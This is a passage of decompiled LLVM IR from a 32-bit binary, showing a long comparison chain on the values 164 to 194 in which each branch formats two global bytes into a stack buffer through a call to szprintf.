  br label %dec_label_pc_804bbd8

dec_label_pc_804bbd8:                             ; preds = %dec_label_pc_804bba5, %dec_label_pc_804bbae
  %v12_804bbd8 = icmp eq i32 %v11_8049ca7, 164
  %v1_804bbdf = icmp eq i1 %v12_804bbd8, false
  br i1 %v1_804bbdf, label %dec_label_pc_804bc0b, label %dec_label_pc_804bbe1

dec_label_pc_804bbe1:                             ; preds = %dec_label_pc_804bbd8
  %v0_804bbe1 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804bbe1 = zext i8 %v0_804bbe1 to i32
  store i32 %v1_804bbe1, i32* @edx, align 4
  %v0_804bbed = load i8, i8* @global_var_805b539.40, align 1
  %v1_804bbed = zext i8 %v0_804bbed to i32
  %v2_804bbfc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bbfc, i32* @ebx, align 4
  %v5_804bc03 = call i32 @szprintf(i32 %v2_804bbfc, i32 ptrtoint ([14 x i8]* @global_var_8058695.186 to i32), i32 %v1_804bbed, i32 %v1_804bbe1)
  br label %dec_label_pc_804bc0b

dec_label_pc_804bc0b:                             ; preds = %dec_label_pc_804bbd8, %dec_label_pc_804bbe1
  %v12_804bc0b = icmp eq i32 %v11_8049ca7, 165
  %v1_804bc12 = icmp eq i1 %v12_804bc0b, false
  br i1 %v1_804bc12, label %dec_label_pc_804bc3e, label %dec_label_pc_804bc14

dec_label_pc_804bc14:                             ; preds = %dec_label_pc_804bc0b
  %v0_804bc14 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804bc14 = zext i8 %v0_804bc14 to i32
  store i32 %v1_804bc14, i32* @edx, align 4
  %v0_804bc20 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804bc20 = zext i8 %v0_804bc20 to i32
  %v2_804bc2f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc2f, i32* @ebx, align 4
  %v5_804bc36 = call i32 @szprintf(i32 %v2_804bc2f, i32 ptrtoint ([13 x i8]* @global_var_8058735.198 to i32), i32 %v1_804bc20, i32 %v1_804bc14)
  br label %dec_label_pc_804bc3e

dec_label_pc_804bc3e:                             ; preds = %dec_label_pc_804bc0b, %dec_label_pc_804bc14
  %v12_804bc3e = icmp eq i32 %v11_8049ca7, 166
  %v1_804bc45 = icmp eq i1 %v12_804bc3e, false
  br i1 %v1_804bc45, label %dec_label_pc_804bc71, label %dec_label_pc_804bc47

dec_label_pc_804bc47:                             ; preds = %dec_label_pc_804bc3e
  %v0_804bc47 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804bc47 = zext i8 %v0_804bc47 to i32
  store i32 %v1_804bc47, i32* @edx, align 4
  %v0_804bc53 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804bc53 = zext i8 %v0_804bc53 to i32
  %v2_804bc62 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc62, i32* @ebx, align 4
  %v5_804bc69 = call i32 @szprintf(i32 %v2_804bc62, i32 ptrtoint ([14 x i8]* @global_var_8058742.199 to i32), i32 %v1_804bc53, i32 %v1_804bc47)
  br label %dec_label_pc_804bc71

dec_label_pc_804bc71:                             ; preds = %dec_label_pc_804bc3e, %dec_label_pc_804bc47
  %v12_804bc71 = icmp eq i32 %v11_8049ca7, 167
  %v1_804bc78 = icmp eq i1 %v12_804bc71, false
  br i1 %v1_804bc78, label %dec_label_pc_804bca4, label %dec_label_pc_804bc7a

dec_label_pc_804bc7a:                             ; preds = %dec_label_pc_804bc71
  %v0_804bc7a = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804bc7a = zext i8 %v0_804bc7a to i32
  store i32 %v1_804bc7a, i32* @edx, align 4
  %v0_804bc86 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804bc86 = zext i8 %v0_804bc86 to i32
  %v2_804bc95 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc95, i32* @ebx, align 4
  %v5_804bc9c = call i32 @szprintf(i32 %v2_804bc95, i32 ptrtoint ([14 x i8]* @global_var_80586f0.193 to i32), i32 %v1_804bc86, i32 %v1_804bc7a)
  br label %dec_label_pc_804bca4

dec_label_pc_804bca4:                             ; preds = %dec_label_pc_804bc71, %dec_label_pc_804bc7a
  %v12_804bca4 = icmp eq i32 %v11_8049ca7, 168
  %v1_804bcab = icmp eq i1 %v12_804bca4, false
  br i1 %v1_804bcab, label %dec_label_pc_804bcd7, label %dec_label_pc_804bcad

dec_label_pc_804bcad:                             ; preds = %dec_label_pc_804bca4
  %v0_804bcad = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804bcad = zext i8 %v0_804bcad to i32
  store i32 %v1_804bcad, i32* @edx, align 4
  %v0_804bcb9 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804bcb9 = zext i8 %v0_804bcb9 to i32
  %v2_804bcc8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bcc8, i32* @ebx, align 4
  %v5_804bccf = call i32 @szprintf(i32 %v2_804bcc8, i32 ptrtoint ([14 x i8]* @global_var_8058750.200 to i32), i32 %v1_804bcb9, i32 %v1_804bcad)
  br label %dec_label_pc_804bcd7

dec_label_pc_804bcd7:                             ; preds = %dec_label_pc_804bca4, %dec_label_pc_804bcad
  %v12_804bcd7 = icmp eq i32 %v11_8049ca7, 169
  %v1_804bcde = icmp eq i1 %v12_804bcd7, false
  br i1 %v1_804bcde, label %dec_label_pc_804bd0a, label %dec_label_pc_804bce0

dec_label_pc_804bce0:                             ; preds = %dec_label_pc_804bcd7
  %v0_804bce0 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804bce0 = zext i8 %v0_804bce0 to i32
  store i32 %v1_804bce0, i32* @edx, align 4
  %v0_804bcec = load i8, i8* @global_var_805b539.40, align 1
  %v1_804bcec = zext i8 %v0_804bcec to i32
  %v2_804bcfb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bcfb, i32* @ebx, align 4
  %v5_804bd02 = call i32 @szprintf(i32 %v2_804bcfb, i32 ptrtoint ([14 x i8]* @global_var_805875e.201 to i32), i32 %v1_804bcec, i32 %v1_804bce0)
  br label %dec_label_pc_804bd0a

dec_label_pc_804bd0a:                             ; preds = %dec_label_pc_804bcd7, %dec_label_pc_804bce0
  %v12_804bd0a = icmp eq i32 %v11_8049ca7, 171
  %v1_804bd11 = icmp eq i1 %v12_804bd0a, false
  br i1 %v1_804bd11, label %dec_label_pc_804bd3d, label %dec_label_pc_804bd13

dec_label_pc_804bd13:                             ; preds = %dec_label_pc_804bd0a
  %v0_804bd13 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804bd13 = zext i8 %v0_804bd13 to i32
  store i32 %v1_804bd13, i32* @edx, align 4
  %v0_804bd1f = load i8, i8* @global_var_805b539.40, align 1
  %v1_804bd1f = zext i8 %v0_804bd1f to i32
  %v2_804bd2e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd2e, i32* @ebx, align 4
  %v5_804bd35 = call i32 @szprintf(i32 %v2_804bd2e, i32 ptrtoint ([14 x i8]* @global_var_805876c.202 to i32), i32 %v1_804bd1f, i32 %v1_804bd13)
  br label %dec_label_pc_804bd3d

dec_label_pc_804bd3d:                             ; preds = %dec_label_pc_804bd0a, %dec_label_pc_804bd13
  %v12_804bd3d = icmp eq i32 %v11_8049ca7, 172
  %v1_804bd44 = icmp eq i1 %v12_804bd3d, false
  br i1 %v1_804bd44, label %dec_label_pc_804bd70, label %dec_label_pc_804bd46

dec_label_pc_804bd46:                             ; preds = %dec_label_pc_804bd3d
  %v0_804bd46 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804bd46 = zext i8 %v0_804bd46 to i32
  store i32 %v1_804bd46, i32* @edx, align 4
  %v0_804bd52 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804bd52 = zext i8 %v0_804bd52 to i32
  %v2_804bd61 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd61, i32* @ebx, align 4
  %v5_804bd68 = call i32 @szprintf(i32 %v2_804bd61, i32 ptrtoint ([14 x i8]* @global_var_805877a.203 to i32), i32 %v1_804bd52, i32 %v1_804bd46)
  br label %dec_label_pc_804bd70

dec_label_pc_804bd70:                             ; preds = %dec_label_pc_804bd3d, %dec_label_pc_804bd46
  %v12_804bd70 = icmp eq i32 %v11_8049ca7, 173
  %v1_804bd77 = icmp eq i1 %v12_804bd70, false
  br i1 %v1_804bd77, label %dec_label_pc_804bda3, label %dec_label_pc_804bd79

dec_label_pc_804bd79:                             ; preds = %dec_label_pc_804bd70
  %v0_804bd79 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804bd79 = zext i8 %v0_804bd79 to i32
  store i32 %v1_804bd79, i32* @edx, align 4
  %v0_804bd85 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804bd85 = zext i8 %v0_804bd85 to i32
  %v2_804bd94 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd94, i32* @ebx, align 4
  %v5_804bd9b = call i32 @szprintf(i32 %v2_804bd94, i32 ptrtoint ([14 x i8]* @global_var_8058788.204 to i32), i32 %v1_804bd85, i32 %v1_804bd79)
  br label %dec_label_pc_804bda3

dec_label_pc_804bda3:                             ; preds = %dec_label_pc_804bd70, %dec_label_pc_804bd79
  %v12_804bda3 = icmp eq i32 %v11_8049ca7, 174
  %v1_804bdaa = icmp eq i1 %v12_804bda3, false
  br i1 %v1_804bdaa, label %dec_label_pc_804bdd6, label %dec_label_pc_804bdac

dec_label_pc_804bdac:                             ; preds = %dec_label_pc_804bda3
  %v0_804bdac = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804bdac = zext i8 %v0_804bdac to i32
  store i32 %v1_804bdac, i32* @edx, align 4
  %v0_804bdb8 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804bdb8 = zext i8 %v0_804bdb8 to i32
  %v2_804bdc7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bdc7, i32* @ebx, align 4
  %v5_804bdce = call i32 @szprintf(i32 %v2_804bdc7, i32 ptrtoint ([13 x i8]* @global_var_8058796.205 to i32), i32 %v1_804bdb8, i32 %v1_804bdac)
  br label %dec_label_pc_804bdd6

dec_label_pc_804bdd6:                             ; preds = %dec_label_pc_804bda3, %dec_label_pc_804bdac
  %v12_804bdd6 = icmp eq i32 %v11_8049ca7, 175
  %v1_804bddd = icmp eq i1 %v12_804bdd6, false
  br i1 %v1_804bddd, label %dec_label_pc_804be09, label %dec_label_pc_804bddf

dec_label_pc_804bddf:                             ; preds = %dec_label_pc_804bdd6
  %v0_804bddf = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804bddf = zext i8 %v0_804bddf to i32
  store i32 %v1_804bddf, i32* @edx, align 4
  %v0_804bdeb = load i8, i8* @global_var_805b539.40, align 1
  %v1_804bdeb = zext i8 %v0_804bdeb to i32
  %v2_804bdfa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bdfa, i32* @ebx, align 4
  %v5_804be01 = call i32 @szprintf(i32 %v2_804bdfa, i32 ptrtoint ([14 x i8]* @global_var_80587a3.206 to i32), i32 %v1_804bdeb, i32 %v1_804bddf)
  br label %dec_label_pc_804be09

dec_label_pc_804be09:                             ; preds = %dec_label_pc_804bdd6, %dec_label_pc_804bddf
  %v9_804be09 = icmp eq i32 %v11_8049ca7, 176
  %v1_804be10 = icmp eq i1 %v9_804be09, false
  br i1 %v1_804be10, label %dec_label_pc_804be3c, label %dec_label_pc_804be12

dec_label_pc_804be12:                             ; preds = %dec_label_pc_804be09
  %v0_804be12 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804be12 = zext i8 %v0_804be12 to i32
  store i32 %v1_804be12, i32* @edx, align 4
  %v0_804be1e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804be1e = zext i8 %v0_804be1e to i32
  %v2_804be2d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be2d, i32* @ebx, align 4
  %v5_804be34 = call i32 @szprintf(i32 %v2_804be2d, i32 ptrtoint ([14 x i8]* @global_var_80587b1.207 to i32), i32 %v1_804be1e, i32 %v1_804be12)
  br label %dec_label_pc_804be3c

dec_label_pc_804be3c:                             ; preds = %dec_label_pc_804be09, %dec_label_pc_804be12
  %v12_804be3c = icmp eq i32 %v11_8049ca7, 177
  %v1_804be43 = icmp eq i1 %v12_804be3c, false
  br i1 %v1_804be43, label %dec_label_pc_804be6f, label %dec_label_pc_804be45

dec_label_pc_804be45:                             ; preds = %dec_label_pc_804be3c
  %v0_804be45 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804be45 = zext i8 %v0_804be45 to i32
  store i32 %v1_804be45, i32* @edx, align 4
  %v0_804be51 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804be51 = zext i8 %v0_804be51 to i32
  %v2_804be60 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be60, i32* @ebx, align 4
  %v5_804be67 = call i32 @szprintf(i32 %v2_804be60, i32 ptrtoint ([14 x i8]* @global_var_80587bf.208 to i32), i32 %v1_804be51, i32 %v1_804be45)
  br label %dec_label_pc_804be6f

dec_label_pc_804be6f:                             ; preds = %dec_label_pc_804be3c, %dec_label_pc_804be45
  %v12_804be6f = icmp eq i32 %v11_8049ca7, 178
  %v1_804be76 = icmp eq i1 %v12_804be6f, false
  br i1 %v1_804be76, label %dec_label_pc_804bea2, label %dec_label_pc_804be78

dec_label_pc_804be78:                             ; preds = %dec_label_pc_804be6f
  %v0_804be78 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804be78 = zext i8 %v0_804be78 to i32
  store i32 %v1_804be78, i32* @edx, align 4
  %v0_804be84 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804be84 = zext i8 %v0_804be84 to i32
  %v2_804be93 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be93, i32* @ebx, align 4
  %v5_804be9a = call i32 @szprintf(i32 %v2_804be93, i32 ptrtoint ([13 x i8]* @global_var_80587cd.209 to i32), i32 %v1_804be84, i32 %v1_804be78)
  br label %dec_label_pc_804bea2

dec_label_pc_804bea2:                             ; preds = %dec_label_pc_804be6f, %dec_label_pc_804be78
  %v12_804bea2 = icmp eq i32 %v11_8049ca7, 179
  %v1_804bea9 = icmp eq i1 %v12_804bea2, false
  br i1 %v1_804bea9, label %dec_label_pc_804bed5, label %dec_label_pc_804beab

dec_label_pc_804beab:                             ; preds = %dec_label_pc_804bea2
  %v0_804beab = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804beab = zext i8 %v0_804beab to i32
  store i32 %v1_804beab, i32* @edx, align 4
  %v0_804beb7 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804beb7 = zext i8 %v0_804beb7 to i32
  %v2_804bec6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bec6, i32* @ebx, align 4
  %v5_804becd = call i32 @szprintf(i32 %v2_804bec6, i32 ptrtoint ([13 x i8]* @global_var_80587da.210 to i32), i32 %v1_804beb7, i32 %v1_804beab)
  br label %dec_label_pc_804bed5

dec_label_pc_804bed5:                             ; preds = %dec_label_pc_804bea2, %dec_label_pc_804beab
  %v12_804bed5 = icmp eq i32 %v11_8049ca7, 180
  %v1_804bedc = icmp eq i1 %v12_804bed5, false
  br i1 %v1_804bedc, label %dec_label_pc_804bf08, label %dec_label_pc_804bede

dec_label_pc_804bede:                             ; preds = %dec_label_pc_804bed5
  %v0_804bede = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804bede = zext i8 %v0_804bede to i32
  store i32 %v1_804bede, i32* @edx, align 4
  %v0_804beea = load i8, i8* @global_var_805b539.40, align 1
  %v1_804beea = zext i8 %v0_804beea to i32
  %v2_804bef9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bef9, i32* @ebx, align 4
  %v5_804bf00 = call i32 @szprintf(i32 %v2_804bef9, i32 ptrtoint ([13 x i8]* @global_var_80587e7.211 to i32), i32 %v1_804beea, i32 %v1_804bede)
  br label %dec_label_pc_804bf08

dec_label_pc_804bf08:                             ; preds = %dec_label_pc_804bed5, %dec_label_pc_804bede
  %v12_804bf08 = icmp eq i32 %v11_8049ca7, 181
  %v1_804bf0f = icmp eq i1 %v12_804bf08, false
  br i1 %v1_804bf0f, label %dec_label_pc_804bf3b, label %dec_label_pc_804bf11

dec_label_pc_804bf11:                             ; preds = %dec_label_pc_804bf08
  %v0_804bf11 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804bf11 = zext i8 %v0_804bf11 to i32
  store i32 %v1_804bf11, i32* @edx, align 4
  %v0_804bf1d = load i8, i8* @global_var_805b539.40, align 1
  %v1_804bf1d = zext i8 %v0_804bf1d to i32
  %v2_804bf2c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf2c, i32* @ebx, align 4
  %v5_804bf33 = call i32 @szprintf(i32 %v2_804bf2c, i32 ptrtoint ([13 x i8]* @global_var_80587f4.212 to i32), i32 %v1_804bf1d, i32 %v1_804bf11)
  br label %dec_label_pc_804bf3b

dec_label_pc_804bf3b:                             ; preds = %dec_label_pc_804bf08, %dec_label_pc_804bf11
  %v12_804bf3b = icmp eq i32 %v11_8049ca7, 182
  %v1_804bf42 = icmp eq i1 %v12_804bf3b, false
  br i1 %v1_804bf42, label %dec_label_pc_804bf6e, label %dec_label_pc_804bf44

dec_label_pc_804bf44:                             ; preds = %dec_label_pc_804bf3b
  %v0_804bf44 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804bf44 = zext i8 %v0_804bf44 to i32
  store i32 %v1_804bf44, i32* @edx, align 4
  %v0_804bf50 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804bf50 = zext i8 %v0_804bf50 to i32
  %v2_804bf5f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf5f, i32* @ebx, align 4
  %v5_804bf66 = call i32 @szprintf(i32 %v2_804bf5f, i32 ptrtoint ([13 x i8]* @global_var_8058801.213 to i32), i32 %v1_804bf50, i32 %v1_804bf44)
  br label %dec_label_pc_804bf6e

dec_label_pc_804bf6e:                             ; preds = %dec_label_pc_804bf3b, %dec_label_pc_804bf44
  %v12_804bf6e = icmp eq i32 %v11_8049ca7, 183
  %v1_804bf75 = icmp eq i1 %v12_804bf6e, false
  br i1 %v1_804bf75, label %dec_label_pc_804bfa1, label %dec_label_pc_804bf77

dec_label_pc_804bf77:                             ; preds = %dec_label_pc_804bf6e
  %v0_804bf77 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804bf77 = zext i8 %v0_804bf77 to i32
  store i32 %v1_804bf77, i32* @edx, align 4
  %v0_804bf83 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804bf83 = zext i8 %v0_804bf83 to i32
  %v2_804bf92 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf92, i32* @ebx, align 4
  %v5_804bf99 = call i32 @szprintf(i32 %v2_804bf92, i32 ptrtoint ([13 x i8]* @global_var_805814c.84 to i32), i32 %v1_804bf83, i32 %v1_804bf77)
  br label %dec_label_pc_804bfa1

dec_label_pc_804bfa1:                             ; preds = %dec_label_pc_804bf6e, %dec_label_pc_804bf77
  %v12_804bfa1 = icmp eq i32 %v11_8049ca7, 184
  %v1_804bfa8 = icmp eq i1 %v12_804bfa1, false
  br i1 %v1_804bfa8, label %dec_label_pc_804bfd4, label %dec_label_pc_804bfaa

dec_label_pc_804bfaa:                             ; preds = %dec_label_pc_804bfa1
  %v0_804bfaa = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804bfaa = zext i8 %v0_804bfaa to i32
  store i32 %v1_804bfaa, i32* @edx, align 4
  %v0_804bfb6 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804bfb6 = zext i8 %v0_804bfb6 to i32
  %v2_804bfc5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bfc5, i32* @ebx, align 4
  %v5_804bfcc = call i32 @szprintf(i32 %v2_804bfc5, i32 ptrtoint ([13 x i8]* @global_var_805880e.214 to i32), i32 %v1_804bfb6, i32 %v1_804bfaa)
  br label %dec_label_pc_804bfd4

dec_label_pc_804bfd4:                             ; preds = %dec_label_pc_804bfa1, %dec_label_pc_804bfaa
  %v12_804bfd4 = icmp eq i32 %v11_8049ca7, 185
  %v1_804bfdb = icmp eq i1 %v12_804bfd4, false
  br i1 %v1_804bfdb, label %dec_label_pc_804c007, label %dec_label_pc_804bfdd

dec_label_pc_804bfdd:                             ; preds = %dec_label_pc_804bfd4
  %v0_804bfdd = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804bfdd = zext i8 %v0_804bfdd to i32
  store i32 %v1_804bfdd, i32* @edx, align 4
  %v0_804bfe9 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804bfe9 = zext i8 %v0_804bfe9 to i32
  %v2_804bff8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bff8, i32* @ebx, align 4
  %v5_804bfff = call i32 @szprintf(i32 %v2_804bff8, i32 ptrtoint ([13 x i8]* @global_var_805881b.215 to i32), i32 %v1_804bfe9, i32 %v1_804bfdd)
  br label %dec_label_pc_804c007

dec_label_pc_804c007:                             ; preds = %dec_label_pc_804bfd4, %dec_label_pc_804bfdd
  %v12_804c007 = icmp eq i32 %v11_8049ca7, 186
  %v1_804c00e = icmp eq i1 %v12_804c007, false
  br i1 %v1_804c00e, label %dec_label_pc_804c03a, label %dec_label_pc_804c010

dec_label_pc_804c010:                             ; preds = %dec_label_pc_804c007
  %v0_804c010 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804c010 = zext i8 %v0_804c010 to i32
  store i32 %v1_804c010, i32* @edx, align 4
  %v0_804c01c = load i8, i8* @global_var_805b539.40, align 1
  %v1_804c01c = zext i8 %v0_804c01c to i32
  %v2_804c02b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c02b, i32* @ebx, align 4
  %v5_804c032 = call i32 @szprintf(i32 %v2_804c02b, i32 ptrtoint ([14 x i8]* @global_var_8058828.216 to i32), i32 %v1_804c01c, i32 %v1_804c010)
  br label %dec_label_pc_804c03a

dec_label_pc_804c03a:                             ; preds = %dec_label_pc_804c007, %dec_label_pc_804c010
  %v12_804c03a = icmp eq i32 %v11_8049ca7, 187
  %v1_804c041 = icmp eq i1 %v12_804c03a, false
  br i1 %v1_804c041, label %dec_label_pc_804c06d, label %dec_label_pc_804c043

dec_label_pc_804c043:                             ; preds = %dec_label_pc_804c03a
  %v0_804c043 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804c043 = zext i8 %v0_804c043 to i32
  store i32 %v1_804c043, i32* @edx, align 4
  %v0_804c04f = load i8, i8* @global_var_805b539.40, align 1
  %v1_804c04f = zext i8 %v0_804c04f to i32
  %v2_804c05e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c05e, i32* @ebx, align 4
  %v5_804c065 = call i32 @szprintf(i32 %v2_804c05e, i32 ptrtoint ([14 x i8]* @global_var_8058836.217 to i32), i32 %v1_804c04f, i32 %v1_804c043)
  br label %dec_label_pc_804c06d

dec_label_pc_804c06d:                             ; preds = %dec_label_pc_804c03a, %dec_label_pc_804c043
  %v12_804c06d = icmp eq i32 %v11_8049ca7, 188
  %v1_804c074 = icmp eq i1 %v12_804c06d, false
  br i1 %v1_804c074, label %dec_label_pc_804c0a0, label %dec_label_pc_804c076

dec_label_pc_804c076:                             ; preds = %dec_label_pc_804c06d
  %v0_804c076 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804c076 = zext i8 %v0_804c076 to i32
  store i32 %v1_804c076, i32* @edx, align 4
  %v0_804c082 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804c082 = zext i8 %v0_804c082 to i32
  %v2_804c091 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c091, i32* @ebx, align 4
  %v5_804c098 = call i32 @szprintf(i32 %v2_804c091, i32 ptrtoint ([14 x i8]* @global_var_8058844.218 to i32), i32 %v1_804c082, i32 %v1_804c076)
  br label %dec_label_pc_804c0a0

dec_label_pc_804c0a0:                             ; preds = %dec_label_pc_804c06d, %dec_label_pc_804c076
  %v12_804c0a0 = icmp eq i32 %v11_8049ca7, 189
  %v1_804c0a7 = icmp eq i1 %v12_804c0a0, false
  br i1 %v1_804c0a7, label %dec_label_pc_804c0d3, label %dec_label_pc_804c0a9

dec_label_pc_804c0a9:                             ; preds = %dec_label_pc_804c0a0
  %v0_804c0a9 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804c0a9 = zext i8 %v0_804c0a9 to i32
  store i32 %v1_804c0a9, i32* @edx, align 4
  %v0_804c0b5 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804c0b5 = zext i8 %v0_804c0b5 to i32
  %v2_804c0c4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c0c4, i32* @ebx, align 4
  %v5_804c0cb = call i32 @szprintf(i32 %v2_804c0c4, i32 ptrtoint ([14 x i8]* @global_var_8058852.219 to i32), i32 %v1_804c0b5, i32 %v1_804c0a9)
  br label %dec_label_pc_804c0d3

dec_label_pc_804c0d3:                             ; preds = %dec_label_pc_804c0a0, %dec_label_pc_804c0a9
  %v12_804c0d3 = icmp eq i32 %v11_8049ca7, 190
  %v1_804c0da = icmp eq i1 %v12_804c0d3, false
  br i1 %v1_804c0da, label %dec_label_pc_804c106, label %dec_label_pc_804c0dc

dec_label_pc_804c0dc:                             ; preds = %dec_label_pc_804c0d3
  %v0_804c0dc = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804c0dc = zext i8 %v0_804c0dc to i32
  store i32 %v1_804c0dc, i32* @edx, align 4
  %v0_804c0e8 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804c0e8 = zext i8 %v0_804c0e8 to i32
  %v2_804c0f7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c0f7, i32* @ebx, align 4
  %v5_804c0fe = call i32 @szprintf(i32 %v2_804c0f7, i32 ptrtoint ([14 x i8]* @global_var_8058860.220 to i32), i32 %v1_804c0e8, i32 %v1_804c0dc)
  br label %dec_label_pc_804c106

dec_label_pc_804c106:                             ; preds = %dec_label_pc_804c0d3, %dec_label_pc_804c0dc
  %v12_804c106 = icmp eq i32 %v11_8049ca7, 191
  %v1_804c10d = icmp eq i1 %v12_804c106, false
  br i1 %v1_804c10d, label %dec_label_pc_804c139, label %dec_label_pc_804c10f

dec_label_pc_804c10f:                             ; preds = %dec_label_pc_804c106
  %v0_804c10f = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804c10f = zext i8 %v0_804c10f to i32
  store i32 %v1_804c10f, i32* @edx, align 4
  %v0_804c11b = load i8, i8* @global_var_805b539.40, align 1
  %v1_804c11b = zext i8 %v0_804c11b to i32
  %v2_804c12a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c12a, i32* @ebx, align 4
  %v5_804c131 = call i32 @szprintf(i32 %v2_804c12a, i32 ptrtoint ([14 x i8]* @global_var_805886e.221 to i32), i32 %v1_804c11b, i32 %v1_804c10f)
  br label %dec_label_pc_804c139

dec_label_pc_804c139:                             ; preds = %dec_label_pc_804c106, %dec_label_pc_804c10f
  %v9_804c139 = icmp eq i32 %v11_8049ca7, 192
  %v1_804c140 = icmp eq i1 %v9_804c139, false
  br i1 %v1_804c140, label %dec_label_pc_804c16c, label %dec_label_pc_804c142

dec_label_pc_804c142:                             ; preds = %dec_label_pc_804c139
  %v0_804c142 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804c142 = zext i8 %v0_804c142 to i32
  store i32 %v1_804c142, i32* @edx, align 4
  %v0_804c14e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804c14e = zext i8 %v0_804c14e to i32
  %v2_804c15d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c15d, i32* @ebx, align 4
  %v5_804c164 = call i32 @szprintf(i32 %v2_804c15d, i32 ptrtoint ([13 x i8]* @global_var_805887c.222 to i32), i32 %v1_804c14e, i32 %v1_804c142)
  br label %dec_label_pc_804c16c

dec_label_pc_804c16c:                             ; preds = %dec_label_pc_804c139, %dec_label_pc_804c142
  %v12_804c16c = icmp eq i32 %v11_8049ca7, 193
  %v1_804c173 = icmp eq i1 %v12_804c16c, false
  br i1 %v1_804c173, label %dec_label_pc_804c19f, label %dec_label_pc_804c175

dec_label_pc_804c175:                             ; preds = %dec_label_pc_804c16c
  %v0_804c175 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804c175 = zext i8 %v0_804c175 to i32
  store i32 %v1_804c175, i32* @edx, align 4
  %v0_804c181 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804c181 = zext i8 %v0_804c181 to i32
  %v2_804c190 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c190, i32* @ebx, align 4
  %v5_804c197 = call i32 @szprintf(i32 %v2_804c190, i32 ptrtoint ([13 x i8]* @global_var_8058889.223 to i32), i32 %v1_804c181, i32 %v1_804c175)
  br label %dec_label_pc_804c19f

dec_label_pc_804c19f:                             ; preds = %dec_label_pc_804c16c, %dec_label_pc_804c175
  %v12_804c19f = icmp eq i32 %v11_8049ca7, 194
  %v1_804c1a6 = icmp eq i1 %v12_804c19f, false
  br i1 %v1_804c1a6, label %dec_label_pc_804c1d2, label %dec_label_pc_804c1a8

dec_label_pc_804c1a8:                             ; preds = %dec_label_pc_804c19f
  %v0_804c1a8 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804c1a8 = zext i8 %v0_804c1a8 to i32
  store i32 %v1_804c1a8, i32* @edx, align 4
  %v0_804c1b4 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804c1b4 = zext i8 %v0_804c1b4 to i32
